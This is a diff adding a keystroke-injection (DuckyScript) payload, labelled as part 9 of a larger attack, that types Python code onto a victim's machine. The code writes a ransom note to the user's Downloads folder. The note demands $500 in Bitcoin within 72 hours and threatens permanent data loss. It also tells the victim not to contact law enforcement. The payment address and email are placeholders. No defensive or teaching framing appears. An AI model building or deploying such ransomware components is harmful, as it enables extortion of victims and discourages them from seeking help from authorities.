@@ -1,0 +1,183 @@
+REM #######################################################
+REM #                                                     #
+REM #           PART 9.0 LEAVE RANSOM NOTE                #
+REM #                                                     #
+REM #######################################################
+
+
+DELAY 1000 
+ENTER 
+DELAY 500
+ENTER 
+DELAY 400
+ENTER 
+
+STRING import os
+DELAY 500
+ENTER 
+DELAY 140
+STRING 
+text_content = """IMPORTANT: Your Files Are Encrypted!
+DELAY 150
+ENTER
+DELAY 140
+ENTER 
+DELAY 140
+STRING Hello,
+DELAY 140
+ENTER 
+DELAY 140 
+ENTER 
+DELAY 140 
+STRING Your files have been encrypted using advanced encryption algorithms. To regain access to your files, you need to follow these instructions carefully.
+DELAY 450
+ENTER 
+DELAY 140 
+ENTER 
+DELAY 140
+STRING 1. Do Not Panic: Your files are secure, but only you can unlock them.
+DELAY 220
+ENTER 
+DELAY 140 
+ENTER 
+DELAY 140 
+STRING 2. Payment Instructions:
+DELAY 140
+ENTER 
+DELAY 140
+ENTER 
+DELAY 140 
+STRING Amount: $500 USD
+DELAY 100
+ENTER 
+DELAY 140
+STRING Cryptocurrency: Bitcoin
+DELAY 150
+ENTER 
+DELAY 140
+STRING Bitcoin Address: 1A2b3C4d5E6f7G8h9I0JkLmNoPqrStUvWxYz
+DELAY 200
+ENTER 
+DELAY 140 
+ENTER 
+DELAY 140
+STRING 3. Deadline: You have 72 hours to make the payment. If you do not comply, the encryption key will be permanently deleted, and your files will be lost forever.
+DELAY 450
+ENTER 
+DELAY 140
+ENTER 
+DELAY 140
+STRING 4. How to Pay:
+DELAY 120
+ENTER 
+DELAY 140 
+ENTER 
+DELAY 140 
+STRING Use a cryptocurrency wallet to send the specified amount to the Bitcoin address provided.
+DELAY 300 
+ENTER 
+DELAY 140 
+STRING After payment, send an email to support@ransomware-example.com with your transaction ID and a note mentioning the decryption key request.
+DELAY 450
+ENTER 
+DELAY 140 
+ENTER 
+DELAY 140 
+STRING 5. Decryption Key:
+DELAY 130
+ENTER
+DELAY 140
+ENTER 
+DELAY 140
+STRING 6. Warning:
+DELAY 140
+ENTER 
+DELAY 140 
+ENTER 
+DELAY 140 
+STRING Attempting to remove or alter the encryption may lead to permanent loss of data.
+DELAY 300
+ENTER 
+DELAY 140
+STRING Do not contact law enforcement or attempt to reverse-engineer the encryption. Doing so will result in immediate data destruction.
+DELAY 400
+ENTER 
+DELAY 140
+ENTER 
+DELAY 140
+STRING 7. Contact Information:
+DELAY 160
+ENTER 
+DELAY 140 
+ENTER 
+DELAY 140 
+STRING Email: support@ransomware-example.com
+DELAY 130
+ENTER 
+DELAY 140 
+STRING Support Hours: 24/7
+DELAY 130
+ENTER 
+DELAY 140
+ENTER 
+DELAY 140 
+STRING Remember, the only way to recover your files is by following the above steps. Your cooperation is appreciated.
+DELAY 400 
+ENTER 
+DELAY 140 
+ENTER 
+DELAY 140 
+STRING Sincerely,
+DELAY 110 
+ENTER 
+DELAY 140 
+STRING The Ransomware Team"""
+DELAY 160
+ENTER 
+DELAY 140 
+ENTER 
+DELAY 140 
+
+REM PART 2 OF 9.0
+
+ENTER 
+DELAY 140
+STRING file_name = "IMPORTANT_Read_Me.txt"
+DELAY 170
+ENTER 
+DELAY 140 
+STRING file_path = f"C:\\Users\\{selected_user}\\Downloads\\{file_name}"
+DELAY 210
+ENTER 
+DELAY 140 
+ENTER
+DELAY 140
+ENTER 
+DELAY 140 
+STRING try:
+DELAY 100
+SHIFT ENTER
+DELAY 180 
+STRING     with open(file_path, "w") as file:
+DELAY 180 
+ENTER 
+DELAY 140 
+STRING         file.write(text_content)
+DELAY 180
+ENTER 
+DELAY 140 
+STRING     print(f"Text written to: {file_path}")
+DELAY 160
+ENTER 
+DELAY 140 
+STRING except Exception as e:
+DELAY 140
+ENTER 
+DELAY 140 
+STRING     print(f"An error occurred: {e}")
+DELAY 150 
+ENTER 
+DELAY 140 
+ENTER 
+DELAY 140 
+
